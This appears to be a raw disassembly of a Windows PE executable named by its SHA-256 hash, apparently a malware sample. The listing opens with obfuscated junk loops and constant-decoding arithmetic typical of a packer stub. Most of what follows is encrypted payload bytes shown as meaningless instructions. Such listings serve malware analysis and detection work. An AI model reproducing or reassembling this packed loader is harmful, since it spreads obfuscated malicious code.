
9939bf32ff446f6ca8fac51ca4af4db312ea33b9b294f99fb253b3e544cc4785.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x90
  401009:	push   esi
  40100a:	and    DWORD PTR ds:0x42a010,0x0
  401014:	jmp    0x401024
  401019:	mov    eax,ds:0x42a010
  40101e:	inc    eax
  40101f:	mov    ds:0x42a010,eax
  401024:	cmp    DWORD PTR ds:0x42a010,0x1d
  40102b:	jae    0x401072
  401031:	cmp    DWORD PTR ds:0x42a010,0xc
  401038:	jne    0x40104c
  40103e:	push   0x42900c
  401043:	push   DWORD PTR [ebp-0x18]
  401046:	call   DWORD PTR ds:0x424014
  40104c:	cmp    DWORD PTR ds:0x42a010,0xb
  401053:	jne    0x401067
  401059:	xor    eax,eax
  40105b:	xor    eax,DWORD PTR ds:0x42a010
  401061:	inc    eax
  401062:	mov    ds:0x42a010,eax
  401067:	jmp    0x401019
  40106c:	adc    ecx,0xcd5
  401072:	push   edi
  401073:	mov    DWORD PTR ds:0x42b004,0x1e
  40107d:	cmp    DWORD PTR ds:0x42b004,0x0
  401084:	je     0x4010e3
  40108a:	cmp    DWORD PTR ds:0x42b004,0x2b
  401091:	jne    0x4010bf
  401097:	push   DWORD PTR [ebp-0x10]
  40109a:	push   0x42b010
  40109f:	push   0x2447
  4010a4:	push   0x42b00c
  4010a9:	push   0x8949
  4010ae:	push   DWORD PTR [ebp-0x14]
  4010b1:	push   DWORD PTR [ebp-0x10]
  4010b4:	push   0x13a5
  4010b9:	call   DWORD PTR ds:0x424018
  4010bf:	xor    esi,esi
  4010c1:	or     esi,DWORD PTR ds:0x42b004
  4010c7:	dec    esi
  4010c8:	mov    DWORD PTR ds:0x42b004,esi
  4010ce:	jmp    0x40107d
  4010d3:	mov    eax,ds:0x42a004
  4010d8:	adc    eax,DWORD PTR ds:0x42b00c
  4010de:	mov    ds:0x42a004,eax
  4010e3:	mov    eax,ds:0x421922
  4010e8:	mov    DWORD PTR [ebp-0x2c],eax
  4010eb:	and    DWORD PTR ds:0x428010,0x0
  4010f5:	mov    ecx,DWORD PTR ds:0x428010
  4010fb:	inc    ecx
  4010fc:	mov    DWORD PTR ds:0x428010,ecx
  401102:	cmp    DWORD PTR ds:0x428010,0x2d
  401109:	jne    0x401118
  40110f:	push   DWORD PTR [ebp-0xc]
  401112:	call   DWORD PTR ds:0x42401c
  401118:	cmp    DWORD PTR ds:0x428010,0x1f
  40111f:	jb     0x4010f5
  401125:	mov    eax,ds:0x421a2e
  40112a:	and    DWORD PTR ds:0x42b008,ebx
  401130:	mov    DWORD PTR [ebp-0x3c],eax
  401133:	sbb    DWORD PTR ds:0x42b010,ebx
  401139:	and    DWORD PTR [ebp-0x34],0x0
  40113d:	or     eax,0x2114
  401142:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  401149:	xor    eax,eax
  40114b:	or     eax,DWORD PTR ds:0x429008
  401151:	xor    DWORD PTR ds:0x428008,eax
  401157:	mov    DWORD PTR [ebp-0x30],0xf89c85b5
  40115e:	mov    eax,DWORD PTR [ebp-0x1c]
  401161:	add    edi,DWORD PTR ds:0x429008
  401167:	mov    ecx,DWORD PTR [ebp-0x1c]
  40116a:	add    edi,esi
  40116c:	xor    eax,ecx
  40116e:	add    DWORD PTR ds:0x428024,edx
  401174:	mov    DWORD PTR [ebp-0x1c],eax
  401177:	and    DWORD PTR ds:0x42c000,0x0
  401181:	xor    eax,eax
  401183:	or     eax,DWORD PTR ds:0x42c000
  401189:	inc    eax
  40118a:	mov    ds:0x42c000,eax
  40118f:	cmp    DWORD PTR ds:0x42c000,0x19
  401196:	jne    0x4011a8
  40119c:	push   DWORD PTR [ebp-0x1c]
  40119f:	push   DWORD PTR [ebp-0xc]
  4011a2:	call   DWORD PTR ds:0x424020
  4011a8:	cmp    DWORD PTR ds:0x42c000,0x14
  4011af:	jb     0x401181
  4011b5:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  4011bc:	xor    DWORD PTR ds:0x428014,0x3e14
  4011c6:	mov    eax,DWORD PTR [ebp-0x28]
  4011c9:	sbb    edi,ecx
  4011cb:	mov    ecx,DWORD PTR [ebp-0x28]
  4011ce:	and    DWORD PTR ds:0x42a008,0x0
  4011d8:	mov    esi,DWORD PTR ds:0x42a008
  4011de:	inc    esi
  4011df:	mov    DWORD PTR ds:0x42a008,esi
  4011e5:	cmp    DWORD PTR ds:0x42a008,0x7
  4011ec:	jne    0x40121a
  4011f2:	push   0x42b018
  4011f7:	push   0x2bd6
  4011fc:	push   DWORD PTR [ebp-0x14]
  4011ff:	push   0x428004
  401204:	push   DWORD PTR [ebp-0x20]
  401207:	push   0x42352e
  40120c:	push   0x1e5d
  401211:	push   DWORD PTR [ebp-0x28]
  401214:	call   DWORD PTR ds:0x424024
  40121a:	cmp    DWORD PTR ds:0x42a008,0x6
  401221:	jne    0x401234
  401227:	mov    esi,DWORD PTR ds:0x42a008
  40122d:	inc    esi
  40122e:	mov    DWORD PTR ds:0x42a008,esi
  401234:	cmp    DWORD PTR ds:0x42a008,0x16
  40123b:	jb     0x4011d8
  401241:	sub    DWORD PTR ds:0x42c00c,0x2ac6
  40124b:	xor    eax,ecx
  40124d:	dec    ecx
  40124e:	mov    DWORD PTR [ebp-0x28],eax
  401251:	and    DWORD PTR ds:0x428018,0x0
  40125b:	jmp    0x40126d
  401260:	mov    edi,DWORD PTR ds:0x428018
  401266:	inc    edi
  401267:	mov    DWORD PTR ds:0x428018,edi
  40126d:	cmp    DWORD PTR ds:0x428018,0x1f
  401274:	jae    0x4012b7
  40127a:	cmp    DWORD PTR ds:0x428018,0x11
  401281:	jne    0x401298
  401287:	push   0x4738
  40128c:	push   DWORD PTR [ebp-0x10]
  40128f:	push   DWORD PTR [ebp-0x24]
  401292:	call   DWORD PTR ds:0x424028
  401298:	cmp    DWORD PTR ds:0x428018,0x10
  40129f:	jne    0x4012b2
  4012a5:	mov    edi,DWORD PTR ds:0x428018
  4012ab:	inc    edi
  4012ac:	mov    DWORD PTR ds:0x428018,edi
  4012b2:	jmp    0x401260
  4012b7:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  4012be:	mov    eax,DWORD PTR [ebp-0x18]
  4012c1:	and    DWORD PTR ds:0x428020,0x0
  4012cb:	mov    ecx,DWORD PTR ds:0x428020
  4012d1:	inc    ecx
  4012d2:	mov    DWORD PTR ds:0x428020,ecx
  4012d8:	cmp    DWORD PTR ds:0x428020,0x15
  4012df:	jne    0x4012f5
  4012e5:	push   0x4235f5
  4012ea:	push   0x423679
  4012ef:	call   DWORD PTR ds:0x424030
  4012f5:	cmp    DWORD PTR ds:0x428020,0x14
  4012fc:	jb     0x4012cb
  401302:	mov    ecx,DWORD PTR [ebp-0x18]
  401305:	and    DWORD PTR ds:0x42b000,0x0
  40130f:	jmp    0x401321
  401314:	mov    edi,DWORD PTR ds:0x42b000
  40131a:	inc    edi
  40131b:	mov    DWORD PTR ds:0x42b000,edi
  401321:	cmp    DWORD PTR ds:0x42b000,0x19
  401328:	jae    0x401378
  40132e:	cmp    DWORD PTR ds:0x42b000,0xa
  401335:	jne    0x401359
  40133b:	push   DWORD PTR [ebp-0x18]
  40133e:	push   0x3609
  401343:	push   DWORD PTR [ebp-0xc]
  401346:	push   DWORD PTR [ebp-0x18]
  401349:	push   0x6b70
  40134e:	push   0x42901c
  401353:	call   DWORD PTR ds:0x424038
  401359:	cmp    DWORD PTR ds:0x42b000,0x9
  401360:	jne    0x401373
  401366:	mov    edi,DWORD PTR ds:0x42b000
  40136c:	inc    edi
  40136d:	mov    DWORD PTR ds:0x42b000,edi
  401373:	jmp    0x401314
  401378:	xor    eax,ecx
  40137a:	mov    DWORD PTR [ebp-0x18],eax
  40137d:	add    DWORD PTR [ebp-0x18],0xf89c85f6
  401384:	mov    eax,DWORD PTR [ebp-0x24]
  401387:	mov    ecx,DWORD PTR [ebp-0x24]
  40138a:	xor    eax,ecx
  40138c:	mov    DWORD PTR [ebp-0x24],eax
  40138f:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  401396:	mov    eax,DWORD PTR [ebp-0x14]
  401399:	mov    ecx,DWORD PTR [ebp-0x14]
  40139c:	xor    eax,ecx
  40139e:	mov    DWORD PTR [ebp-0x14],eax
  4013a1:	mov    eax,DWORD PTR [ebp-0x20]
  4013a4:	mov    ecx,DWORD PTR [ebp-0x14]
  4013a7:	mov    esi,0x7510893
  4013ac:	xor    eax,esi
  4013ae:	mov    edi,0x3272db
  4013b3:	add    eax,edi
  4013b5:	xor    eax,ecx
  4013b7:	mov    DWORD PTR [ebp-0x14],eax
  4013ba:	mov    eax,DWORD PTR [ebp-0x10]
  4013bd:	mov    ecx,DWORD PTR [ebp-0x10]
  4013c0:	sub    eax,ecx
  4013c2:	mov    DWORD PTR [ebp-0x10],eax
  4013c5:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  4013cc:	mov    al,BYTE PTR [ebp-0x1]
  4013cf:	movzx  ecx,BYTE PTR [ebp-0x1]
  4013d3:	movzx  eax,al
  4013d6:	sub    ecx,eax
  4013d8:	mov    BYTE PTR [ebp-0x1],cl
  4013db:	movzx  eax,BYTE PTR [ebp-0x1]
  4013df:	xor    eax,0xffffff99
  4013e2:	mov    BYTE PTR [ebp-0x1],al
  4013e5:	mov    eax,DWORD PTR [ebp-0x20]
  4013e8:	xor    eax,esi
  4013ea:	add    eax,edi
  4013ec:	mov    DWORD PTR [ebp-0x14],eax
  4013ef:	lea    eax,[ebp-0x40]
  4013f2:	mov    DWORD PTR [ebp-0x38],eax
  4013f5:	lea    eax,[ebp-0x38]
  4013f8:	mov    DWORD PTR [ebp-0x44],eax
  4013fb:	lea    eax,[ebp-0x44]
  4013fe:	mov    DWORD PTR [ebp-0x8],eax
  401401:	lea    eax,[ebp-0x8]
  401404:	mov    DWORD PTR [ebp-0x48],eax
  401407:	mov    eax,DWORD PTR [ebp-0x18]
  40140a:	xor    eax,esi
  40140c:	add    eax,edi
  40140e:	push   eax
  40140f:	mov    eax,DWORD PTR [ebp-0x1c]
  401412:	xor    eax,esi
  401414:	add    eax,edi
  401416:	push   eax
  401417:	mov    eax,DWORD PTR [ebp-0x10]
  40141a:	xor    eax,esi
  40141c:	add    eax,edi
  40141e:	push   eax
  40141f:	lea    eax,[ebp-0x90]
  401425:	push   eax
  401426:	push   DWORD PTR [ebp-0x20]
  401429:	push   DWORD PTR [ebp-0x30]
  40142c:	call   0x40914a
  401431:	test   eax,eax
  401433:	je     0x401464
  401439:	lea    eax,[ebp-0x90]
  40143f:	push   eax
  401440:	mov    eax,DWORD PTR [ebp-0x30]
  401443:	xor    eax,esi
  401445:	add    eax,edi
  401447:	push   eax
  401448:	mov    eax,DWORD PTR [ebp-0x2c]
  40144b:	add    eax,0xaa
  401450:	push   eax
  401451:	mov    eax,DWORD PTR [ebp-0x2c]
  401454:	mov    eax,DWORD PTR [eax+0x198]
  40145a:	push   DWORD PTR [eax]
  40145c:	call   0x405c6f
  401461:	mov    DWORD PTR [ebp-0x40],eax
  401464:	lea    eax,[ebp+0x4]
  401467:	mov    DWORD PTR [ebp-0x34],eax
  40146a:	mov    eax,DWORD PTR [ebp-0x8]
  40146d:	mov    eax,DWORD PTR [eax]
  40146f:	mov    eax,DWORD PTR [eax]
  401471:	mov    eax,DWORD PTR [eax]
  401473:	test   eax,eax
  401475:	je     0x4038ab
  40147b:	lea    eax,[ebp-0xc]
  40147e:	mov    DWORD PTR [ebp-0x4c],eax
  401481:	mov    eax,DWORD PTR [ebp-0x3c]
  401484:	mov    DWORD PTR [ebp-0xc],eax
  401487:	mov    eax,DWORD PTR [ebp-0x8]
  40148a:	mov    eax,DWORD PTR [eax]
  40148c:	mov    eax,DWORD PTR [eax]
  40148e:	mov    eax,DWORD PTR [eax]
  401490:	sub    DWORD PTR [ebp-0xc],eax
  401493:	mov    ecx,DWORD PTR [ebp-0x10]
  401496:	xor    ecx,esi
  401498:	mov    eax,0xffcd8d25
  40149d:	sub    eax,ecx
  40149f:	jmp    0x403854
  4014a4:	out    dx,al
  4014a5:	add    eax,0x6723a723
  4014aa:	outs   dx,BYTE PTR ds:[esi]
  4014ab:	sbb    DWORD PTR [edx+0x1b],0xf
  4014af:	hlt    
  4014b0:	mov    ds:0x627e2749,eax
  4014b5:	bound  esp,QWORD PTR [edx+0x62]
  4014b8:	retf   0x625f
  4014bb:	bound  ecx,QWORD PTR [ecx]
  4014bd:	sub    eax,DWORD PTR [edi]
  4014bf:	pop    edx
  4014c0:	add    eax,0x792c0356
  4014c5:	jne    0x40153c
  4014c7:	inc    edi
  4014c8:	adc    eax,esi
  4014ca:	jb     0x401510
  4014cc:	jno    0x4014f3
  4014ce:	iret   
  4014cf:	retf   
  4014d0:	hlt    
  4014d1:	inc    ebp
  4014d2:	aam    0x97
  4014d4:	cdq    
  4014d5:	add    ebp,DWORD PTR [edx]
  4014d7:	pop    esp
  4014d8:	jno    0x401544
  4014da:	mov    es,WORD PTR [edx-0x43be3b9c]
  4014e0:	daa    
  4014e1:	mov    ecx,0x54f9627
  4014e6:	shr    BYTE PTR [ebp+eax*1+0x2],1
  4014ea:	adc    cl,al
  4014ec:	(bad)  
  4014ed:	(bad)  [esi-0x78]
  4014f0:	and    BYTE PTR [esi+0x31c900b0],dl
  4014f6:	dec    esi
  4014f7:	fbstp  TBYTE PTR [edx-0x62cc368d]
  4014fd:	mov    cs,WORD PTR [eax+0x78]
  401500:	jo     0x4014b8
  401502:	dec    edi
  401503:	pushf  
  401504:	pop    eax
  401505:	jae    0x401491
  401507:	sti    
  401508:	push   es
  401509:	push   0xc72c3d54
  40150e:	pop    esi
  40150f:	cmp    BYTE PTR [edx+0x6c],dl
  401512:	add    ecx,DWORD PTR [edi]
  401514:	push   ss
  401515:	jge    0x40153e
  401517:	mov    ebx,0xa6ab63c3
  40151c:	mov    esp,0xc531c291
  401521:	stc    
  401522:	inc    ebx
  401523:	popf   
  401524:	xchg   edx,eax
  401525:	in     eax,0x12
  401527:	fstp   QWORD PTR [edx]
  401529:	jg     0x4014c9
  40152b:	cmp    ecx,edi
  40152d:	mov    al,ds:0xdb808269
  401532:	dec    ecx
  401533:	loop   0x4014ee
  401535:	inc    eax
  401536:	or     BYTE PTR [ebx],0x2c
  401539:	inc    ebx
  40153a:	pop    ecx
  40153b:	mov    ecx,0xda183803
  401540:	xor    ebx,DWORD PTR [esi+0x22]
  401543:	sbb    ch,BYTE PTR [ebx+ecx*1]
  401546:	inc    esi
  401547:	add    esp,DWORD PTR [eax-0x32d94fe1]
  40154d:	dec    ebp
  40154e:	nop
  40154f:	xchg   edi,eax
  401550:	dec    esi
  401551:	mov    cl,0x25
  401553:	pop    ecx
  401554:	les    ebp,FWORD PTR [eax]
  401556:	sub    eax,ecx
  401558:	vpsubusw xmm0,xmm7,XMMWORD PTR [edi-0x25]
  40155d:	mov    edi,0xdb06d0ab
  401562:	test   al,0x7e
  401564:	bound  edx,QWORD PTR [ebp+0x268b1b46]
  40156a:	in     eax,0xc2
  40156c:	push   ds
  40156d:	sub    DWORD PTR [ebp+0x6c],0x51
  401571:	imul   ebp,edx,0x47d00cb4
  401577:	rol    BYTE PTR [esp+ebx*2-0x7fe85951],cl
  40157e:	outs   dx,DWORD PTR ds:[esi]
  40157f:	jbe    0x401530
  401581:	jae    0x4015d1
  401583:	mov    ah,0x68
  401585:	outs   dx,BYTE PTR ds:[esi]
  401586:	and    dl,BYTE PTR [edx+0x3f]
  401589:	adc    bh,BYTE PTR [eax-0x6e]
  40158c:	mov    eax,ds:0x34640fca
  401591:	xor    BYTE PTR [edx+edx*4],bh
  401594:	push   ecx
  401595:	push   cs
  401596:	mov    ds:0x4780308,eax
  40159b:	add    al,0xdd
  40159d:	mov    eax,0xd9d80a03
  4015a2:	mov    al,ds:0xd84658e3
  4015a7:	mov    edi,0x99e2bf64
  4015ac:	ins    DWORD PTR es:[edi],dx
  4015ad:	mov    cl,dh
  4015af:	sbb    al,0xf2
  4015b1:	or     cl,ah
  4015b3:	adc    DWORD PTR [edx],esi
  4015b5:	xlat   BYTE PTR ds:[ebx]
  4015b6:	std    
  4015b7:	(bad)  
  4015b8:	hlt    
  4015b9:	imul   edi,DWORD PTR gs:[ebx-0x639f0134],0xab660204
  4015c4:	xor    BYTE PTR [ebx-0x1d06d532],0xb6
  4015cb:	pop    edi
  4015cc:	xor    eax,0xbc507d4a
  4015d1:	aam    0x13
  4015d3:	(bad)  
  4015d5:	cld    
  4015d6:	addr16 pop edx
  4015d8:	out    dx,eax
  4015d9:	mov    ch,bl
  4015db:	mov    eax,0x2bc48cc8
  4015e0:	sbb    al,0xb7
  4015e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015e3:	sbb    BYTE PTR [eax],dh
  4015e5:	add    al,0xcf
  4015e7:	fs push 0xffffffa8
  4015ea:	cld    
  4015eb:	pop    ds
  4015ec:	ss dec esp
  4015ee:	out    0x25,al
  4015f0:	push   ebx
  4015f1:	fimul  DWORD PTR [edi-0x1d]
  4015f4:	xor    DWORD PTR ds:0x9cd1720,eax
  4015fa:	mov    edi,0x4f4dc4c1
  4015ff:	cld    
  401600:	pop    ecx
  401601:	and    al,0x1a
  401603:	sbb    edx,DWORD PTR [eax]
  401605:	aam    0x89
  401607:	xchg   esi,eax
  401608:	dec    esp
  401609:	jo     0x4015d0
  40160b:	add    BYTE PTR [esi-0x670ecfa2],ah
  401611:	(bad)  
  401613:	adc    eax,0x7e3684db
  401618:	aaa    
  401619:	dec    ebx
  40161a:	jmp    0x40166a
  40161c:	mov    bl,0xe2
  40161e:	pop    edx
  40161f:	sub    al,0x59
  401621:	dec    edi
  401622:	sub    al,0x9
  401624:	mov    eax,ds:0x5161756a
  401629:	dec    ecx
  40162a:	pop    ecx
  40162b:	jmp    0x8848:0x347a55f0
  401632:	in     al,0xae
  401634:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401635:	push   edi
  401636:	cmp    DWORD PTR [edx+0x7808c540],ecx
  40163c:	imul   ebx,DWORD PTR [ebx+edx*2-0x6c43f70c],0x1f
  401644:	mov    al,0xc1
  401646:	cmp    esp,DWORD PTR [ebp-0x5b]
  401649:	pop    ss
  40164a:	adc    BYTE PTR [edi-0x662f088],dh
  401650:	or     esp,DWORD PTR [esi]
  401652:	dec    ebx
  401653:	mov    edi,edx
  401655:	lea    edi,[ebp-0x4b251baa]
  40165b:	js     0x4016dc
  40165d:	and    ebp,edx
  40165f:	jbe    0x40165d
  401661:	aam    0xcd
  401663:	ror    DWORD PTR [ebx],cl
  401665:	and    BYTE PTR [eax],cl
  401667:	jmp    0x85d76cb1
  40166c:	adc    esi,DWORD PTR [ecx]
  40166e:	sbb    BYTE PTR [esi-0x7179ecd9],ah
  401674:	mov    gs,WORD PTR [edi]
  401676:	pop    ecx
  401677:	mov    al,ds:0x7a624552
  40167c:	mov    ecx,0x3a80900c
  401681:	pop    eax
  401682:	(bad)  
  401683:	xchg   esp,eax
  401684:	ins    DWORD PTR es:[edi],dx
  401685:	fcomip st,st(0)
  401687:	(bad)  
  401688:	cmc    
  401689:	cmp    DWORD PTR [ecx],ebx
  40168b:	hlt    
  40168c:	fs dec esi
  40168e:	mov    bl,ah
  401690:	and    BYTE PTR [ebx],dh
  401692:	nop
  401693:	adc    BYTE PTR [edi+0x5b],dh
  401696:	xchg   ebp,eax
  401697:	inc    ebp
  401698:	add    edi,esi
  40169a:	call   0xa51cae
  40169f:	adc    ah,BYTE PTR [edx]
  4016a1:	and    BYTE PTR [ebp+edx*8+0x5d],dl
  4016a5:	adc    BYTE PTR [edx+0x394b96d3],cl
  4016ab:	jg     0x40163c
  4016ad:	mov    al,ds:0x7f3d5df6
  4016b2:	popf   
  4016b3:	sbb    eax,0x412c02c0
  4016b8:	sti    
  4016b9:	fistp  QWORD PTR [edi-0x30]
  4016bc:	push   ds
  4016bd:	fsubr  QWORD PTR [edi+0xa2be84f]
  4016c3:	test   al,0xf0
  4016c5:	sub    eax,0x433fc31a
  4016ca:	imul   ebx,eax,0x31ad8861
  4016d0:	(bad)  
  4016d1:	cmc    
  4016d2:	aas    
  4016d3:	ror    BYTE PTR [edi-0x12],cl
  4016d6:	push   0x5
  4016d8:	mov    DWORD PTR [edi+0x11b9ec90],esp
  4016de:	nop
  4016df:	inc    edi
  4016e0:	xchg   esp,eax
  4016e1:	call   0xa1a8953c
  4016e6:	(bad)  
  4016e7:	and    DWORD PTR [ecx],ecx
  4016e9:	shr    BYTE PTR [edi-0x48],0x69
  4016ed:	adc    edx,DWORD PTR [edx]
  4016ef:	mov    edi,0x7c36e36d
  4016f4:	adc    BYTE PTR [esi-0x3d55cbf8],0x31
  4016fb:	out    dx,al
  4016fc:	mov    edi,0x41c2f2bb
  401701:	jl     0x401695
  401703:	gs mov eax,0x45531e37
  401709:	mov    edi,DWORD PTR [edx+eax*1+0x48]
  40170d:	mov    edi,0x27b1beee
  401712:	xlat   BYTE PTR ds:[ebx]
  401713:	popa   
  401714:	add    ch,BYTE PTR [ebx]
  401716:	jmp    0x401699
  401718:	mov    esp,0xe91bf41b
  40171d:	jmp    0xc5205f1f
  401722:	out    0xd1,al
  401724:	xchg   edx,eax
  401725:	cmp    edi,DWORD PTR [ecx+0x4d]
  401728:	xchg   bh,bl
  40172a:	hlt    
  40172b:	inc    eax
  40172c:	jge    0x4016d7
  40172e:	jae    0x401771
  401730:	or     eax,0xd707eb88
  401735:	adc    al,0x4b
  401737:	push   0x7ad9adcd
  40173c:	mov    esp,0xff9b054d
  401741:	(bad)  
  401743:	push   0x3f
  401745:	fst    DWORD PTR [eax]
  401747:	jge    0x401771
  401749:	mov    ebp,0x62b71323
  40174e:	mov    eax,0x45898092
  401753:	call   0x3b81:0x74f1c30a
  40175a:	jl     0x401787
  40175c:	adc    ebx,DWORD PTR [eax+0x6e]
  40175f:	arpl   WORD PTR ds:0xc57c9e0f,bp
  401765:	add    al,0xc6
  401767:	je     0x40170d
  401769:	xlat   BYTE PTR ds:[ebx]
  40176a:	xlat   BYTE PTR ds:[ebx]
  40176b:	bnd jb 0x401754
  40176e:	call   0x636:0x83cb54b
  401775:	sbb    al,BYTE PTR [edx-0x169db991]
  40177b:	sbb    ch,BYTE PTR [edi+ecx*2]
  40177e:	addr16 mov al,ds:0xe238
  401782:	aaa    
  401783:	jmp    0x4a10:0x8423f111
  40178a:	rcl    DWORD PTR [ebp-0x38],0xf7
  40178e:	push   0x3f212a41
  401793:	push   0x5645db4a
  401798:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401799:	sub    dl,0x1b
  40179c:	push   0xfffffff7
  40179e:	scas   al,BYTE PTR es:[edi]
  40179f:	pop    ecx
  4017a0:	jmp    0x40181b
  4017a2:	sar    DWORD PTR [eax+0x2f],1
  4017a5:	mov    al,0xd6
  4017a7:	in     eax,0x68
  4017a9:	mov    al,ds:0x4bf5b99c
  4017ae:	mov    esi,0x1a9bc9da
  4017b3:	mov    ds:0x6213d6f0,al
  4017b8:	je     0x40182b
  4017ba:	outs   dx,DWORD PTR ds:[esi]
  4017bb:	dec    edx
  4017bc:	call   0x54f0:0x27396405
  4017c3:	cs push edx
  4017c5:	sbb    ecx,DWORD PTR [edi-0x16]
  4017c8:	cli    
  4017c9:	adc    eax,0x5f5c6b45
  4017ce:	sub    eax,0x7b64131d
  4017d3:	xor    BYTE PTR [ebx+esi*2+0x2e1b5a50],bh
  4017da:	cwde   
  4017db:	aas    
  4017dc:	cwde   
  4017dd:	pop    eax
  4017de:	pushf  
  4017df:	sbb    eax,0xa195e348
  4017e4:	dec    esp
  4017e5:	(bad)  [eax]
  4017e7:	loop   0x4017cc
  4017e9:	int3   
  4017ea:	mov    esp,0xcf0f370
  4017ef:	and    al,0xbc
  4017f1:	mov    cl,0x3f
  4017f3:	push   cs
  4017f4:	cwde   
  4017f5:	sbb    BYTE PTR [ebp+edi*1-0x7],0xd4
  4017fa:	and    ah,dh
  4017fc:	les    esi,FWORD PTR [esi+0x79a7b4eb]
  401802:	dec    eax
  401803:	xor    eax,0xdb39cd40
  401808:	ret    0xfa05
  40180b:	mov    eax,ds:0x1d5ee912
  401810:	sub    DWORD PTR [edi-0x228e651f],0xfffffff0
  401817:	inc    esi
  401818:	clc    
  401819:	xchg   ebx,eax
  40181a:	push   0xfffffffc
  40181c:	dec    eax
  40181d:	pop    ss
  40181e:	mov    esi,0x6725760f
  401823:	popf   
  401824:	push   es
  401825:	adc    BYTE PTR [ebx-0x1eaeac9a],bl
  40182b:	xchg   ebp,eax
  40182c:	sbb    eax,0x357bd742
  401831:	shl    BYTE PTR [eax+0x29],1
  401834:	lds    eax,FWORD PTR [ecx+0x5f]
  401837:	push   ebx
  401838:	and    DWORD PTR [ecx],edi
  40183a:	sub    eax,0xf6b5ee83
  40183f:	and    dl,ch
  401841:	sbb    BYTE PTR [ecx],dh
  401843:	xor    dh,BYTE PTR [eax-0x1]
  401846:	ss (bad) 
  401848:	or     BYTE PTR ss:[eax],bh
  40184b:	cmp    BYTE PTR [ecx+eax*2+0x291cfd11],ch
  401852:	repnz sub esp,DWORD PTR [edx-0x53]
  401856:	scas   al,BYTE PTR es:[edi]
  401857:	xor    al,0xeb
  401859:	mov    ds:0xc8ee1f4d,al
  40185e:	shr    DWORD PTR [edi-0x19a07e07],0xa4
  401865:	int    0xc9
  401867:	test   BYTE PTR [edi+0x2572f693],ah
  40186d:	inc    eax
  40186e:	mov    ah,0xbd
  401870:	dec    esp
  401871:	or     eax,0xa1de32b
  401876:	cs stc 
  401878:	jp     0x4018c6
  40187a:	test   DWORD PTR [edx+ebp*1],ebp
  40187d:	fst    DWORD PTR [ecx]
  40187f:	push   ss
  401880:	out    dx,eax
  401881:	dec    ebx
  401882:	cdq    
  401883:	addr16 jmp 0xf78c:0x554f10ac
  40188b:	jo     0x401897
  40188d:	dec    eax
  40188e:	sbb    eax,0x33b48998
  401893:	js     0x40182e
  401895:	cmp    al,0xb1
  401897:	aad    0xd1
  401899:	aad    0x1b
  40189b:	pop    edi
  40189c:	jl     0x401898
  40189e:	dec    ebp
  40189f:	call   0x192a:0x9650bbf2
  4018a6:	jne    0x401924
  4018a8:	and    dh,0x32
  4018ab:	das    
  4018ac:	sbb    al,0x6f
  4018ae:	retf   
  4018af:	and    edx,esp
  4018b1:	pushw  ds
  4018b3:	mov    esi,0xb61085a3
  4018b8:	call   0x80c2d679
  4018bd:	mov    edi,DWORD PTR [edx-0x6dc64267]
  4018c3:	inc    ecx
  4018c4:	cmp    al,0x3
  4018c6:	push   edi
  4018c7:	retf   0xc802
  4018ca:	mov    eax,0xad1ef5b6
  4018cf:	push   cs
  4018d0:	or     BYTE PTR [ebx],ch
  4018d2:	idiv   DWORD PTR [ecx+esi*1-0x5d8a7480]
  4018d9:	dec    ecx
  4018da:	mov    ah,0x9a
  4018dc:	arpl   WORD PTR [ecx+0x507e903b],bx
  4018e2:	das    
  4018e3:	or     al,0xab
  4018e5:	inc    edx
  4018e6:	add    esp,ebp
  4018e8:	cld    
  4018e9:	and    DWORD PTR [eax+eax*8],0x20cac555
  4018f0:	sar    BYTE PTR [esi-0xb],cl
  4018f3:	mov    dl,0xd5
  4018f5:	xchg   esp,eax
  4018f6:	mov    al,0xb6
  4018f8:	sbb    cl,dl
  4018fa:	mov    ds:0x969c3a37,al
  4018ff:	pop    ss
  401900:	repnz sbb al,0x57
  401903:	cmp    dh,dl
  401905:	lods   al,BYTE PTR ds:[esi]
  401906:	xchg   edi,eax
  401907:	popa   
  401908:	add    edi,esi
  40190a:	inc    edx
  40190b:	jmp    0x9a2b:0x4e5abbf5
  401912:	js     0x4018e7
  401914:	fst    QWORD PTR [ebp+0x58]
  401917:	loopne 0x4018ba
  401919:	dec    ebp
  40191a:	test   eax,0x98b4ea2c
  40191f:	add    BYTE PTR [ebp+0x1],0x49
  401923:	jle    0x401947
  401925:	call   0xf3a9:0x54ce7805
  40192c:	jg     0x401991
  40192e:	aam    0x2
  401930:	jo     0x401941
  401932:	lds    di,DWORD PTR [esi-0x4c]
  401936:	scas   eax,DWORD PTR es:[edi]
  401937:	xor    DWORD PTR [esi+0x379479f6],esi
  40193d:	fwait
  40193e:	push   ds
  40193f:	xchg   BYTE PTR ds:0xad3d2705,ch
  401945:	mov    esi,ebx
  401947:	jg     0x4018ec
  401949:	inc    ebp
  40194a:	mov    esp,0xa33f4aef
  40194f:	or     al,0x3c
  401951:	push   ds
  401952:	pop    ebp
  401953:	mov    al,ds:0xbe6e1a26
  401958:	mov    al,0x68
  40195a:	cmc    
  40195b:	stos   BYTE PTR es:[edi],al
  40195c:	popa   
  40195d:	mov    bh,0xb7
  40195f:	jo     0x4019ad
  401961:	xchg   ebx,eax
  401962:	mov    ebp,0x4a51a8a8
  401967:	mov    ah,ah
  401969:	cmp    al,0x3d
  40196b:	xchg   DWORD PTR [eax],edi
  40196d:	std    
  40196e:	sbb    ecx,DWORD PTR [ebx+0x2e]
  401971:	xchg   ebx,eax
  401972:	out    dx,al
  401973:	jno    0x401934
  401975:	in     eax,0x53
  401977:	fs je  0x401964
  40197a:	sbb    cl,cl
  40197c:	jl     0x40197e
  40197e:	cmp    ebp,edx
  401980:	lahf   
  401981:	sub    al,0xe2
  401983:	add    dh,BYTE PTR [ebx]
  401985:	add    al,0x3f
  401987:	imul   edx,ebp,0x0
  40198a:	(bad)
  40198e:	pop    ds
  40198f:	cmp    DWORD PTR [edx],eax
  401991:	addr16 xor ah,bl
  401994:	in     al,dx
  401995:	out    dx,al
  401996:	mov    eax,0xee37f603
